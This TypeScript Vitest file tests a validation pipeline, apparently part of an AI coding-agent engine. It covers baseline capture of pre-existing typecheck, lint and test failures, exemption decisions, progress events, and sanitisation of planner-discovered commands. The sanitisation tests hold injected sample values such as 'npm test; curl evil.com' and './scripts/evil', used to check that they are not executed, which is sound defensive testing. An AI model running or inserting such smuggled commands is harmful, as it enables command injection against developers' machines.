import { describe, it, expect, afterEach, beforeEach } from 'vitest';
import { writeFileSync, mkdirSync } from 'node:fs';
import { join } from 'node:path';
import { createValidator } from './run.js';
import { formatValidationError } from './format-error.js';
import { createEventBus } from '../../events/bus.js';
import type { EngineEvent, EngineEventOf } from '../../events/types.js';
import { createTempDir, cleanupTempDir } from '#testing/helpers/temp-dir.js';
import type { Task } from '../../../core/schemas/task.js';
import { makeTask } from '#testing/helpers/factories/task.js';
import {
  ValidationBaselineSchema,
  type DiscoveredValidation,
} from '../../../core/schemas/workflow.js';
import { processError } from '../../../lib/process/errors.js';
import { makeConfig, makeCommandRunner } from '#testing/helpers/validation-fixtures.js';

function mkTask(file: string): Task {
  return makeTask({ file, action: 'modify' });
}

function writeTsProject(dir: string): void {
  writeFileSync(join(dir, 'tsconfig.json'), '{}');
  writeFileSync(join(dir, 'package.json'), '{"scripts":{"test":"vitest run"}}');
}

const fakeBus = { publish: () => {}, subscribe: () => () => {} };

describe('run-start baseline of pre-existing failures', () => {
  let tempDir: string;

  beforeEach(() => {
    tempDir = createTempDir('val-baseline');
  });

  afterEach(() => {
    cleanupTempDir(tempDir);
  });

  it('continues to lint and test when typecheck was already red at baseline', async () => {
    const typeError = () =>
      processError.exitCode({ command: 'tsc', code: 1, stderr: 'type error', output: '' });
    const validator = createValidator({
      runCommand: makeCommandRunner(
        typeError(),
        { stdout: 'ok', stderr: '', code: 0 },
        { stdout: 'ok', stderr: '', code: 0 },
        typeError(),
        { stdout: 'ok', stderr: '', code: 0 },
        { stdout: 'ok', stderr: '', code: 0 },
      ),
      captureBaseline: true,
    });
    const config = makeConfig({
      typecheck: true,
      typecheckCommand: 'npm run typecheck',
      lint: true,
      lintCommand: 'npm run lint',
      test: true,
      testCommand: 'npm test',
    });

    await validator.primeBaseline({
      task: mkTask('src/app.ts'),
      projectDir: tempDir,
      config,
      bus: fakeBus,
      phase: 'implementing',
    });
    const results = await validator.runValidation({
      task: mkTask('src/app.ts'),
      projectDir: tempDir,
      config,
      bus: fakeBus,
      phase: 'implementing',
    });

    expect(results.map((r) => r.stage)).toEqual(['typecheck', 'lint', 'test']);
    expect(results.find((r) => r.stage === 'lint')?.passed).toBe(true);
    expect(results.find((r) => r.stage === 'test')?.passed).toBe(true);
  });

  it('stops at the first failure when the baseline was green', async () => {
    const validator = createValidator({
      runCommand: makeCommandRunner(
        { stdout: 'ok', stderr: '', code: 0 },
        { stdout: 'ok', stderr: '', code: 0 },
        { stdout: 'ok', stderr: '', code: 0 },
        processError.exitCode({ command: 'tsc', code: 1, stderr: 'new error', output: '' }),
      ),
      captureBaseline: true,
    });
    const config = makeConfig({
      typecheck: true,
      typecheckCommand: 'npm run typecheck',
      lint: true,
      lintCommand: 'npm run lint',
      test: true,
      testCommand: 'npm test',
    });

    await validator.primeBaseline({
      task: mkTask('src/app.ts'),
      projectDir: tempDir,
      config,
      bus: fakeBus,
      phase: 'implementing',
    });
    const results = await validator.runValidation({
      task: mkTask('src/app.ts'),
      projectDir: tempDir,
      config,
      bus: fakeBus,
      phase: 'implementing',
    });

    expect(results.map((r) => r.stage)).toEqual(['typecheck']);
    const acceptance = validator.decideAcceptance({ results, changedFiles: ['src/app.ts'] });
    expect(acceptance.blockingStages).toContain('typecheck');
    expect(acceptance.exemptStages).toEqual([]);
    const error = formatValidationError(results, acceptance);
    expect(error).toContain('Your previous code had an error');
    expect(error).not.toContain('pre-existing');
  });

  it('exempts nothing when the baseline was never primed', async () => {
    const validator = createValidator({
      runCommand: makeCommandRunner(
        processError.exitCode({ command: 'tsc', code: 1, stderr: 'type error', output: '' }),
      ),
    });
    const config = makeConfig({ typecheck: true, lint: false, test: false });
    writeFileSync(join(tempDir, 'tsconfig.json'), '{}');

    const results = await validator.runValidation({
      task: mkTask('src/app.ts'),
      projectDir: tempDir,
      config,
      bus: fakeBus,
      phase: 'implementing',
    });

    const acceptance = validator.decideAcceptance({ results, changedFiles: ['src/app.ts'] });
    expect(acceptance.exemptStages).toEqual([]);
    expect(acceptance.blockingStages).toContain('typecheck');
    expect(acceptance.accepted).toBe(false);
  });

  it('blocks a red stage whose failure keys are not the ones the baseline probe recorded', async () => {
    const typeError = (stderr: string) => () =>
      processError.exitCode({ command: 'tsc', code: 1, stderr, output: '' });
    const validator = createValidator({
      runCommand: makeCommandRunner(typeError('src/legacy.ts(3,1): error TS2322')()),
      captureBaseline: true,
    });
    const config = makeConfig({ typecheck: true, lint: false, test: false });
    writeFileSync(join(tempDir, 'tsconfig.json'), '{}');

    await validator.primeBaseline({
      task: mkTask('src/app.ts'),
      projectDir: tempDir,
      config,
      bus: fakeBus,
      phase: 'implementing',
    });

    const probedCommand = 'npx tsc --noEmit';
    expect(
      validator.decideAcceptance({
        results: [
          {
            passed: false,
            stage: 'typecheck',
            command: probedCommand,
            failureFiles: ['src/legacy.ts'],
            error: 'src/legacy.ts(3,1): error TS2322',
          },
        ],
        changedFiles: ['src/app.ts'],
      }).exemptStages,
    ).toContain('typecheck');

    expect(
      validator.decideAcceptance({
        results: [
          {
            passed: false,
            stage: 'typecheck',
            command: probedCommand,
            failureFiles: ['src/legacy.ts', 'src/other.ts'],
            error: 'src/legacy.ts(3,1): error TS2322\nsrc/other.ts(9,2): error TS2345',
          },
        ],
        changedFiles: ['src/app.ts'],
      }).blockingStages,
    ).toContain('typecheck');
  });

  it('exempts a baseline-red stage when its evidence names no changed file, and blocks one that does', async () => {
    const typeError = () =>
      processError.exitCode({ command: 'tsc', code: 1, stderr: 'type error', output: '' });
    const validator = createValidator({
      runCommand: makeCommandRunner(typeError()),
      captureBaseline: true,
    });
    const config = makeConfig({ typecheck: true, lint: false, test: false });
    writeFileSync(join(tempDir, 'tsconfig.json'), '{}');

    await validator.primeBaseline({
      task: mkTask('src/app.ts'),
      projectDir: tempDir,
      config,
      bus: fakeBus,
      phase: 'implementing',
    });

    const probedCommand = 'npx tsc --noEmit';
    const exemptAcceptance = validator.decideAcceptance({
      results: [
        {
          passed: false,
          stage: 'typecheck',
          command: probedCommand,
          failureFiles: ['src/unrelated.ts'],
        },
      ],
      changedFiles: ['src/app.ts'],
    });
    expect(exemptAcceptance.exemptStages).toContain('typecheck');
    expect(exemptAcceptance.blockingStages).toEqual([]);
    expect(exemptAcceptance.accepted).toBe(true);
    expect(
      formatValidationError(
        [{ passed: false, stage: 'typecheck', failureFiles: ['src/unrelated.ts'] }],
        exemptAcceptance,
      ),
    ).toBe('');

    const blockingAcceptance = validator.decideAcceptance({
      results: [
        {
          passed: false,
          stage: 'typecheck',
          command: probedCommand,
          failureFiles: ['src/app.ts'],
        },
      ],
      changedFiles: ['src/app.ts'],
    });
    expect(blockingAcceptance.exemptStages).toEqual([]);
    expect(blockingAcceptance.blockingStages).toContain('typecheck');
    expect(blockingAcceptance.accepted).toBe(false);
  });

  it('an exempt-accepted run publishes the validate event as passed, with exempt', async () => {
    const typeError = () =>
      processError.exitCode({ command: 'tsc', code: 1, stderr: 'type error', output: '' });
    const validator = createValidator({
      runCommand: makeCommandRunner(typeError(), typeError()),
      captureBaseline: true,
    });
    const config = makeConfig({ typecheck: true, lint: false, test: false });
    writeFileSync(join(tempDir, 'tsconfig.json'), '{}');

    await validator.primeBaseline({
      task: mkTask('src/app.ts'),
      projectDir: tempDir,
      config,
      bus: fakeBus,
      phase: 'implementing',
    });

    const events: EngineEvent[] = [];
    const bus = createEventBus();
    bus.subscribe((event) => events.push(event));
    await validator.runValidation({
      task: mkTask('src/app.ts'),
      projectDir: tempDir,
      config,
      bus,
      phase: 'validating-task',
      changedFiles: ['src/app.ts'],
    });

    const done = events.find(
      (event): event is EngineEventOf<'validate'> =>
        event.type === 'validate' && event.status === 'done',
    );
    expect(done).toMatchObject({ passed: true, exempt: true });
    expect('error' in (done ?? {})).toBe(false);
  });

  it('probes the default test baseline against the affected test file, not the whole suite', async () => {
    mkdirSync(join(tempDir, 'src'), { recursive: true });
    writeFileSync(join(tempDir, 'src', 'foo.test.ts'), '');
    writeTsProject(tempDir);
    const runner = makeCommandRunner();
    const validator = createValidator({ runCommand: runner, captureBaseline: true });
    const config = makeConfig({ typecheck: false, lint: false, test: true });

    await validator.primeBaseline({
      task: mkTask('src/foo.ts'),
      projectDir: tempDir,
      config,
      bus: fakeBus,
      phase: 'implementing',
    });

    const baselineProbe = runner.calls[0];
    expect(baselineProbe?.cmd).toBe('npm');
    expect(baselineProbe?.args).toEqual(['test', '--', join('src', 'foo.test.ts')]);
  });

  it('attributes a fresh test failure to the task when the affected file passed at baseline', async () => {
    mkdirSync(join(tempDir, 'src'), { recursive: true });
    writeFileSync(join(tempDir, 'src', 'foo.test.ts'), '');
    writeTsProject(tempDir);
    const validator = createValidator({
      runCommand: makeCommandRunner(
        { stdout: 'ok', stderr: '', code: 0 },
        processError.exitCode({ command: 'npm', code: 1, stderr: 'test failed', output: '' }),
      ),
      captureBaseline: true,
    });
    const config = makeConfig({ typecheck: false, lint: false, test: true });

    await validator.primeBaseline({
      task: mkTask('src/foo.ts'),
      projectDir: tempDir,
      config,
      bus: fakeBus,
      phase: 'implementing',
    });
    const results = await validator.runValidation({
      task: mkTask('src/foo.ts'),
      projectDir: tempDir,
      config,
      bus: fakeBus,
      phase: 'implementing',
    });

    const acceptance = validator.decideAcceptance({ results, changedFiles: ['src/foo.ts'] });
    expect(acceptance.exemptStages).toEqual([]);
    expect(acceptance.blockingStages).toContain('test');
    const error = formatValidationError(results, acceptance);
    expect(error).toContain('Your previous code had an error');
    expect(error).not.toContain('pre-existing');
  });

  it('does not exempt a test failure narrowed to a file the baseline never probed', async () => {
    mkdirSync(join(tempDir, 'src'), { recursive: true });
    writeFileSync(join(tempDir, 'src', 'foo.test.ts'), '');
    writeFileSync(join(tempDir, 'src', 'bar.test.ts'), '');
    writeTsProject(tempDir);
    const validator = createValidator({
      runCommand: makeCommandRunner(
        processError.exitCode({
          command: 'npm',
          code: 1,
          stderr: 'FAIL src/foo.test.ts',
          output: '',
        }),
        processError.exitCode({
          command: 'npm',
          code: 1,
          stderr: 'FAIL src/bar.test.ts',
          output: '',
        }),
      ),
      captureBaseline: true,
    });
    const config = makeConfig({ typecheck: false, lint: false, test: true });

    await validator.primeBaseline({
      task: mkTask('src/foo.ts'),
      projectDir: tempDir,
      config,
      bus: fakeBus,
      phase: 'implementing',
    });
    const results = await validator.runValidation({
      task: mkTask('src/bar.ts'),
      projectDir: tempDir,
      config,
      bus: fakeBus,
      phase: 'implementing',
      changedFiles: ['src/bar.ts'],
    });

    const acceptance = validator.decideAcceptance({ results, changedFiles: ['src/bar.ts'] });
    expect(acceptance.exemptStages).toEqual([]);
    expect(acceptance.blockingStages).toContain('test');
    expect(acceptance.accepted).toBe(false);
  });

  it('still exempts the test stage when the task runs the same narrowed command as the baseline', async () => {
    mkdirSync(join(tempDir, 'src'), { recursive: true });
    writeFileSync(join(tempDir, 'src', 'foo.test.ts'), '');
    writeTsProject(tempDir);
    const validator = createValidator({
      runCommand: makeCommandRunner(
        processError.exitCode({
          command: 'npm',
          code: 1,
          stderr: 'FAIL src/foo.test.ts',
          output: '',
        }),
        processError.exitCode({
          command: 'npm',
          code: 1,
          stderr: 'FAIL src/foo.test.ts',
          output: '',
        }),
      ),
      captureBaseline: true,
    });
    const config = makeConfig({ typecheck: false, lint: false, test: true });

    await validator.primeBaseline({
      task: mkTask('src/foo.ts'),
      projectDir: tempDir,
      config,
      bus: fakeBus,
      phase: 'implementing',
    });
    const results = await validator.runValidation({
      task: mkTask('src/foo.ts'),
      projectDir: tempDir,
      config,
      bus: fakeBus,
      phase: 'implementing',
      changedFiles: ['src/foo.ts'],
    });

    const acceptance = validator.decideAcceptance({ results, changedFiles: ['src/foo.ts'] });
    expect(acceptance.exemptStages).toEqual(['test']);
    expect(acceptance.blockingStages).toEqual([]);
    expect(acceptance.accepted).toBe(true);
  });

  it('does not record a baseline failure when a heuristic command is missing its subcommand', async () => {
    const missingClippy = () =>
      processError.exitCode({
        command: 'cargo',
        label: 'lint validation',
        code: 101,
        stderr: 'error: no such command: `clippy`',
        output: '',
      });
    const validator = createValidator({
      runCommand: makeCommandRunner(missingClippy(), missingClippy()),
      captureBaseline: true,
    });
    const config = makeConfig({ typecheck: false, lint: true, test: false });
    writeFileSync(join(tempDir, 'Cargo.toml'), '[package]\nname = "test"');

    await validator.primeBaseline({
      task: mkTask('src/main.rs'),
      projectDir: tempDir,
      config,
      bus: fakeBus,
      phase: 'implementing',
    });

    const acceptance = validator.decideAcceptance({
      results: [{ passed: false, stage: 'lint', failureFiles: ['src/unrelated.rs'] }],
      changedFiles: ['src/main.rs'],
    });
    expect(acceptance.exemptStages).toEqual([]);
    expect(acceptance.blockingStages).toContain('lint');
  });

  it('pytest run narrows to the affected test file and exempts a baseline-red failure', async () => {
    mkdirSync(join(tempDir, 'tests'), { recursive: true });
    writeFileSync(join(tempDir, 'pyproject.toml'), '[project]\nname = "service"\n');
    writeFileSync(join(tempDir, 'tests', 'service_test.py'), '');
    const redSuite = () =>
      processError.exitCode({
        command: 'pytest',
        code: 1,
        stderr: '',
        output: [
          '=================================== FAILURES ===================================',
          '_________________________________ test_uptime __________________________________',
          '>       assert payload["uptime"] > 0',
          'E       AssertionError: assert 0 > 0',
          'tests/service_test.py:12: AssertionError',
          '=========================== short test summary info ============================',
          'FAILED tests/service_test.py::test_uptime - AssertionError: assert 0 > 0',
          '1 failed, 3 passed in 0.42s',
        ].join('\n'),
      });
    const runner = makeCommandRunner(redSuite(), redSuite());
    const validator = createValidator({ runCommand: runner, captureBaseline: true });
    const config = makeConfig({ typecheck: false, lint: false, test: true });

    await validator.primeBaseline({
      task: mkTask('src/service.py'),
      projectDir: tempDir,
      config,
      bus: fakeBus,
      phase: 'implementing',
    });
    const results = await validator.runValidation({
      task: mkTask('src/service.py'),
      projectDir: tempDir,
      config,
      bus: fakeBus,
      phase: 'implementing',
      changedFiles: ['src/service.py'],
    });

    expect(runner.calls[0]?.cmd).toBe('pytest');
    expect(runner.calls[0]?.args).toEqual([join('tests', 'service_test.py')]);
    expect(results.find((r) => r.stage === 'test')?.command).toBe(
      `pytest ${join('tests', 'service_test.py')}`,
    );
    const acceptance = validator.decideAcceptance({ results, changedFiles: ['src/service.py'] });
    expect(acceptance.exemptStages).toEqual(['test']);
    expect(acceptance.accepted).toBe(true);
  });

  it('go test run narrows to the package and blocks a new failure in an untouched file', async () => {
    mkdirSync(join(tempDir, 'pkg'), { recursive: true });
    writeFileSync(join(tempDir, 'go.mod'), 'module example.com/app\n\ngo 1.23\n');
    writeFileSync(join(tempDir, 'pkg', 'handler_test.go'), '');
    const uptimeRed = '--- FAIL: TestUptime (0.00s)\n    uptime_test.go:12: got 0, want 1';
    const routesRed = '--- FAIL: TestRoutes (0.00s)\n    routes_test.go:9: got "", want "ok"';
    const redPackage = (failures: string) =>
      processError.exitCode({
        command: 'go',
        code: 1,
        stderr: '',
        output: [failures, 'FAIL', 'FAIL\texample.com/app/pkg\t0.104s', 'FAIL'].join('\n'),
      });
    const runner = makeCommandRunner(
      redPackage(uptimeRed),
      redPackage(uptimeRed),
      redPackage(`${uptimeRed}\n${routesRed}`),
    );
    const validator = createValidator({ runCommand: runner, captureBaseline: true });
    const config = makeConfig({ typecheck: false, lint: false, test: true });
    const run = () =>
      validator.runValidation({
        task: mkTask('pkg/handler.go'),
        projectDir: tempDir,
        config,
        bus: fakeBus,
        phase: 'implementing',
        changedFiles: ['pkg/handler.go'],
      });

    await validator.primeBaseline({
      task: mkTask('pkg/handler.go'),
      projectDir: tempDir,
      config,
      bus: fakeBus,
      phase: 'implementing',
    });
    const kept = await run();
    const regressed = await run();

    expect(runner.calls[0]?.cmd).toBe('go');
    expect(runner.calls[0]?.args).toEqual(['test', './pkg/']);
    expect(
      validator.decideAcceptance({ results: kept, changedFiles: ['pkg/handler.go'] }),
    ).toMatchObject({ exemptStages: ['test'], accepted: true });
    expect(regressed.find((r) => r.stage === 'test')?.failureFiles).toEqual([]);
    expect(
      validator.decideAcceptance({ results: regressed, changedFiles: ['pkg/handler.go'] }),
    ).toMatchObject({ blockingStages: ['test'], accepted: false });
  });
});

describe('baseline probe heartbeat', () => {
  let tempDir: string;

  beforeEach(() => {
    tempDir = createTempDir('val-baseline-heartbeat');
  });

  afterEach(() => {
    cleanupTempDir(tempDir);
  });

  function capturedBaselineDone(
    events: EngineEvent[],
  ): EngineEventOf<'validation_baseline'> | undefined {
    return events.find(
      (event): event is EngineEventOf<'validation_baseline'> =>
        event.type === 'validation_baseline' && event.status === 'done',
    );
  }

  it('publishes a running event naming the active stage before any done event', async () => {
    const validator = createValidator({
      runCommand: makeCommandRunner(
        { stdout: 'ok', stderr: '', code: 0 },
        { stdout: 'ok', stderr: '', code: 0 },
      ),
      captureBaseline: true,
    });
    const config = makeConfig({
      typecheck: true,
      typecheckCommand: 'npm run typecheck',
      lint: true,
      lintCommand: 'cargo clippy --no-deps',
      test: false,
    });
    const events: EngineEvent[] = [];
    const bus = createEventBus();
    bus.subscribe((event) => events.push(event));

    await validator.primeBaseline({
      task: mkTask('src/app.ts'),
      projectDir: tempDir,
      config,
      bus,
      phase: 'implementing',
    });

    const activeStageIndex = events.findIndex(
      (event): event is EngineEventOf<'validation_baseline'> =>
        event.type === 'validation_baseline' &&
        event.status === 'running' &&
        event.activeStage !== undefined,
    );
    const doneIndex = events.findIndex(
      (event) => event.type === 'validation_baseline' && event.status === 'done',
    );
    expect(activeStageIndex).toBeGreaterThanOrEqual(0);
    expect(doneIndex).toBeGreaterThan(activeStageIndex);
  });

  it('reports every enabled stage exactly once, red stages in failing and green stages true in stages', async () => {
    const validator = createValidator({
      runCommand: makeCommandRunner(
        { stdout: 'ok', stderr: '', code: 0 },
        processError.exitCode({ command: 'cargo', code: 1, stderr: 'clippy error', output: '' }),
      ),
      captureBaseline: true,
    });
    const config = makeConfig({
      typecheck: true,
      typecheckCommand: 'npm run typecheck',
      lint: true,
      lintCommand: 'cargo clippy --no-deps',
      test: false,
    });
    const events: EngineEvent[] = [];
    const bus = createEventBus();
    bus.subscribe((event) => events.push(event));

    await validator.primeBaseline({
      task: mkTask('src/app.ts'),
      projectDir: tempDir,
      config,
      bus,
      phase: 'implementing',
    });

    expect(capturedBaselineDone(events)).toMatchObject({
      stages: { typecheck: true, lint: false, test: false },
      failing: { lint: true },
      commands: {
        typecheck: 'npm run typecheck',
        lint: 'cargo clippy --no-deps',
      },
    });
  });

  it('reports the affected-test-narrowed test command actually run', async () => {
    mkdirSync(join(tempDir, 'src'), { recursive: true });
    writeFileSync(join(tempDir, 'src', 'foo.test.ts'), '');
    writeTsProject(tempDir);
    const validator = createValidator({
      runCommand: makeCommandRunner(),
      captureBaseline: true,
    });
    const config = makeConfig({ typecheck: false, lint: false, test: true });
    const events: EngineEvent[] = [];
    const bus = createEventBus();
    bus.subscribe((event) => events.push(event));

    await validator.primeBaseline({
      task: mkTask('src/foo.ts'),
      projectDir: tempDir,
      config,
      bus,
      phase: 'implementing',
    });

    expect(capturedBaselineDone(events)?.commands?.test).toContain(join('src', 'foo.test.ts'));
  });

  it('narrows the test stage by the declared files plus the files the attempt changed', async () => {
    mkdirSync(join(tempDir, 'src', 'shared'), { recursive: true });
    writeFileSync(join(tempDir, 'src', 'foo.test.ts'), '');
    writeFileSync(join(tempDir, 'src', 'shared', 'button.test.ts'), '');
    writeTsProject(tempDir);
    const validator = createValidator({ runCommand: makeCommandRunner() });
    const config = makeConfig({ typecheck: false, lint: false, test: true });

    const results = await validator.runValidation({
      task: mkTask('src/foo.ts'),
      projectDir: tempDir,
      config,
      bus: fakeBus,
      phase: 'implementing',
      changedFiles: ['src/foo.ts', 'src/shared/button.ts'],
    });

    const command = results.find((r) => r.stage === 'test')?.command ?? '';
    expect(command).toContain(join('src', 'foo.test.ts'));
    expect(command).toContain(join('src', 'shared', 'button.test.ts'));
  });

  it('never reports a skipped stage as green, and progress agrees with done', async () => {
    mkdirSync(join(tempDir, 'src'), { recursive: true });
    writeFileSync(join(tempDir, 'src', 'foo.test.ts'), '');
    writeTsProject(tempDir);
    const validator = createValidator({
      runCommand: makeCommandRunner(processError.notFound('npm')),
      captureBaseline: true,
    });
    const config = makeConfig({ typecheck: false, lint: false, test: true });
    const events: EngineEvent[] = [];
    const bus = createEventBus();
    bus.subscribe((event) => events.push(event));

    await validator.primeBaseline({
      task: mkTask('src/foo.ts'),
      projectDir: tempDir,
      config,
      bus,
      phase: 'implementing',
    });

    const progress = events.filter(
      (event): event is EngineEventOf<'validation_baseline'> =>
        event.type === 'validation_baseline' && event.status === 'running',
    );
    const done = capturedBaselineDone(events);
    expect(progress.at(-1)?.stages).toEqual({ typecheck: false, lint: false, test: false });
    expect(done?.stages).toEqual(progress.at(-1)?.stages);
    expect(done?.failing).toBeUndefined();
  });

  it('keeps a stage disabled by its master switch out of both sets', async () => {
    const validator = createValidator({
      runCommand: makeCommandRunner({ stdout: 'ok', stderr: '', code: 0 }),
      captureBaseline: true,
    });
    const config = makeConfig({
      typecheck: true,
      typecheckCommand: 'npm run typecheck',
      lint: false,
      test: false,
    });
    const events: EngineEvent[] = [];
    const bus = createEventBus();
    bus.subscribe((event) => events.push(event));

    await validator.primeBaseline({
      task: mkTask('src/app.ts'),
      projectDir: tempDir,
      config,
      bus,
      phase: 'implementing',
    });

    const done = capturedBaselineDone(events);
    expect(done?.stages).toEqual({ typecheck: true, lint: false, test: false });
    expect(done?.failing).toBeUndefined();
  });

  it('publishes nothing when baseline capture is not enabled', async () => {
    const validator = createValidator({ runCommand: makeCommandRunner() });
    const config = makeConfig({
      typecheck: true,
      typecheckCommand: 'npm run typecheck',
      lint: false,
      test: false,
    });
    const events: EngineEvent[] = [];
    const bus = createEventBus();
    bus.subscribe((event) => events.push(event));

    await validator.primeBaseline({
      task: mkTask('src/app.ts'),
      projectDir: tempDir,
      config,
      bus,
      phase: 'implementing',
    });

    expect(events.some((event) => event.type === 'validation_baseline')).toBe(false);
  });
});

describe('validation pipeline', () => {
  let tempDir: string;
  let validator: ReturnType<typeof createValidator>;

  beforeEach(() => {
    tempDir = createTempDir('val-pipe');
    validator = createValidator({ runCommand: makeCommandRunner() });
  });

  afterEach(() => {
    cleanupTempDir(tempDir);
  });

  it('skips typecheck when master switch is off', async () => {
    const config = makeConfig({
      typecheck: false,
      typecheckCommand: 'cargo check',
      lint: false,
      test: false,
    });
    const results = await validator.runValidation({
      task: mkTask('src/main.rs'),
      projectDir: tempDir,
      config,
      bus: fakeBus,
      phase: 'implementing',
    });
    expect(results).toHaveLength(0);
  });

  it('skips lint when master switch is off', async () => {
    const config = makeConfig({ lint: false, lintCommand: 'cargo clippy' });
    const results = await validator.runValidation({
      task: mkTask('src/main.rs'),
      projectDir: tempDir,
      config,
      bus: fakeBus,
      phase: 'implementing',
    });
    const lintResult = results.find((r) => r.stage === 'lint');
    expect(lintResult).toBeUndefined();
  });

  it('skips test when master switch is off', async () => {
    const config = makeConfig({ test: false });
    mkdirSync(join(tempDir, 'tests'), { recursive: true });
    writeFileSync(join(tempDir, 'tests', 'foo.test.ts'), '');
    writeTsProject(tempDir);
    const results = await validator.runValidation({
      task: mkTask('src/foo.ts'),
      projectDir: tempDir,
      config,
      bus: fakeBus,
      phase: 'implementing',
    });
    const testResult = results.find((r) => r.stage === 'test');
    expect(testResult).toBeUndefined();
  });

  it('a missing binary skips the stage and names its reason on the validate event', async () => {
    validator = createValidator({ runCommand: makeCommandRunner(processError.notFound('npx')) });
    const config = makeConfig({ typecheck: true, lint: false, test: false });
    writeFileSync(join(tempDir, 'tsconfig.json'), '{}');
    const events: EngineEvent[] = [];
    const bus = createEventBus();
    bus.subscribe((event) => events.push(event));

    const results = await validator.runValidation({
      task: mkTask('src/main.ts'),
      projectDir: tempDir,
      config,
      bus,
      phase: 'validating-task',
    });

    expect(results[0]).toMatchObject({
      skipped: true,
      skippedReason: 'npx not found, skipping typecheck',
    });
    expect(
      events.find(
        (event): event is EngineEventOf<'validate'> =>
          event.type === 'validate' && event.status === 'done',
      )?.skippedReason,
    ).toEqual({ typecheck: 'npx not found, skipping typecheck' });
  });

  it('never ticks a stage the step itself skipped, so progress agrees with done', async () => {
    validator = createValidator({ runCommand: makeCommandRunner(processError.notFound('npx')) });
    const config = makeConfig({ typecheck: true, lint: false, test: false });
    writeFileSync(join(tempDir, 'tsconfig.json'), '{}');
    const events: EngineEvent[] = [];
    const bus = createEventBus();
    bus.subscribe((event) => events.push(event));

    await validator.runValidation({
      task: mkTask('src/main.ts'),
      projectDir: tempDir,
      config,
      bus,
      phase: 'validating-task',
    });

    const validates = events.filter(
      (event): event is EngineEventOf<'validate'> => event.type === 'validate',
    );
    const progress = validates.filter((event) => event.status === 'running');
    const done = validates.find((event) => event.status === 'done');

    expect(progress.at(-1)?.stages).toEqual({ typecheck: false, lint: false, test: false });
    expect(done?.stages).toEqual(progress.at(-1)?.stages);
  });

  it('publishes the active validation command before the stage completes', async () => {
    const runner = makeCommandRunner({ stdout: '', stderr: '', code: 0 });
    validator = createValidator({ runCommand: runner });
    const config = makeConfig({
      typecheck: true,
      typecheckCommand: 'npm run typecheck',
      lint: false,
      test: false,
    });
    const events: EngineEvent[] = [];
    const bus = createEventBus();
    bus.subscribe((event) => events.push(event));

    const results = await validator.runValidation({
      task: mkTask('src/main.ts'),
      projectDir: tempDir,
      config,
      bus,
      phase: 'validating-task',
    });

    expect(results[0]).toMatchObject({
      stage: 'typecheck',
      command: 'npm run typecheck',
    });
    expect(
      events.find(
        (event): event is EngineEventOf<'validate'> =>
          event.type === 'validate' &&
          event.status === 'running' &&
          event.activeStage === 'typecheck',
      ),
    ).toMatchObject({
      commands: { typecheck: 'npm run typecheck' },
    });
    expect(
      events.find(
        (event): event is EngineEventOf<'validate'> =>
          event.type === 'validate' && event.status === 'done',
      ),
    ).toMatchObject({
      commands: { typecheck: 'npm run typecheck' },
    });
  });
});

describe('all-stages-skipped warning', () => {
  let tempDir: string;

  beforeEach(() => {
    tempDir = createTempDir('val-allskip');
  });

  afterEach(() => {
    cleanupTempDir(tempDir);
  });

  it('publishes a warning when every enabled stage resolves to a skip', async () => {
    const validator = createValidator({ runCommand: makeCommandRunner() });
    const config = makeConfig({ typecheck: true, lint: true, test: true, testCommand: undefined });
    const events: EngineEvent[] = [];
    const bus = createEventBus();
    bus.subscribe((e) => events.push(e));

    await validator.runValidation({
      task: mkTask('src/app.js'),
      projectDir: tempDir,
      config,
      bus,
      phase: 'implementing',
    });

    const warning = events.find((e): e is EngineEventOf<'warning'> => e.type === 'warning');
    expect(warning?.message).toContain('was not validated');
  });

  it('does NOT publish the warning when a stage actually ran', async () => {
    const validator = createValidator({ runCommand: makeCommandRunner() });
    const config = makeConfig({ typecheck: true, lint: false, test: false });
    writeFileSync(join(tempDir, 'tsconfig.json'), '{}');
    const events: EngineEvent[] = [];
    const bus = createEventBus();
    bus.subscribe((e) => events.push(e));

    await validator.runValidation({
      task: mkTask('src/app.ts'),
      projectDir: tempDir,
      config,
      bus,
      phase: 'implementing',
    });

    expect(events.find((e) => e.type === 'warning')).toBeUndefined();
  });
});

describe('discovered validation sanitization', () => {
  let tempDir: string;

  beforeEach(() => {
    tempDir = createTempDir('val-sanitize');
  });

  afterEach(() => {
    cleanupTempDir(tempDir);
  });

  it('does NOT execute planner-discovered ./evil-script', async () => {
    const runner = makeCommandRunner();
    const validator = createValidator({ runCommand: runner });
    const config = makeConfig({
      typecheck: false,
      lint: false,
      test: true,
      testCommand: undefined,
    });
    const discovered: DiscoveredValidation = { testCommand: './scripts/evil' };

    mkdirSync(join(tempDir, 'tests'), { recursive: true });
    writeFileSync(join(tempDir, 'tests', 'foo.test.ts'), '');
    writeTsProject(tempDir);

    const results = await validator.runValidation({
      task: mkTask('src/foo.ts'),
      projectDir: tempDir,
      config,
      bus: fakeBus,
      phase: 'implementing',
      discoveredValidation: discovered,
    });

    expect(runner.calls).toHaveLength(1);
    expect(runner.calls[0]?.cmd).toBe('npm');
    expect(runner.calls.map((call) => [call.cmd, ...call.args].join(' ')).join(' ')).not.toContain(
      'evil',
    );
    const testResult = results.find((result) => result.stage === 'test');
    expect(testResult).toBeDefined();
    expect(testResult?.output).not.toContain('evil');
  });

  it('does NOT execute planner-discovered commands with shell operators', async () => {
    const runner = makeCommandRunner();
    const validator = createValidator({ runCommand: runner });
    const config = makeConfig({
      typecheck: false,
      lint: false,
      test: true,
      testCommand: undefined,
    });
    const discovered: DiscoveredValidation = { testCommand: 'npm test; curl evil.com' };

    mkdirSync(join(tempDir, 'tests'), { recursive: true });
    writeFileSync(join(tempDir, 'tests', 'foo.test.ts'), '');
    writeTsProject(tempDir);

    await validator.runValidation({
      task: mkTask('src/foo.ts'),
      projectDir: tempDir,
      config,
      bus: fakeBus,
      phase: 'implementing',
      discoveredValidation: discovered,
    });

    expect(runner.calls).toHaveLength(1);
    expect(runner.calls[0]?.cmd).toBe('npm');
    expect(runner.calls.map((call) => [call.cmd, ...call.args].join(' ')).join(' ')).not.toContain(
      'curl',
    );
  });

  it('executes safe planner-discovered commands normally', async () => {
    const runner = makeCommandRunner();
    const validator = createValidator({ runCommand: runner });
    const config = makeConfig({
      typecheck: false,
      lint: false,
      test: true,
      testCommand: undefined,
    });
    const discovered: DiscoveredValidation = { testCommand: 'npx vitest run' };

    await validator.runValidation({
      task: mkTask('src/foo.ts'),
      projectDir: tempDir,
      config,
      bus: fakeBus,
      phase: 'implementing',
      discoveredValidation: discovered,
    });

    expect(runner.calls.length).toBeGreaterThan(0);
    expect(runner.calls[0]?.cmd).toBe('npx');
    expect(runner.calls[0]?.args).toContain('vitest');
  });
});

describe('unrecognised stack', () => {
  let tempDir: string;

